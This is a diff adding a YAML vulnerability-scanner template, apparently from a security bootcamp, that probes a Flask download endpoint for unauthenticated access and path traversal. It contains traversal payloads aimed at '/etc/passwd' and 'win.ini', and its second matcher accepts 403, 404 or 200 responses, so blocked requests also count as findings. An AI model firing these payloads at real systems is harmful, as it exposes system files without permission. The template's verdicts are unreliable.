@@ -1,0 +1,53 @@
+id: ch2-file-path-traversal
+info:
+  name: CH2 File Download - Path Traversal LFI & Unauthenticated File Access
+  author: bootcamp
+  severity: high
+  description: |
+    Detects path traversal vulnerability in download endpoint.
+    The endpoint accepts user-controlled file paths with NO authentication/authorization.
+    1. No path traversal protection - can access files outside intended directory
+    2. No authentication required - anyone can download files
+    3. Created secret.txt in /tmp/files and accessed without any auth
+  tags: lfi,path-traversal,no-auth,flask
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/download?file=secret.txt'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'secret'
+          - 'vulnerability'
+        condition: or
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - '{{BaseURL}}/download?file=../../../etc/passwd'
+      - '{{BaseURL}}/download?file=..\..\..\windows\win.ini'
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Not allowed'
+          - 'Not found'
+        condition: or
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0'
+          - '\[fonts\]'
+        condition: or
+      - type: status
+        status:
+          - 403
+          - 404
+          - 200
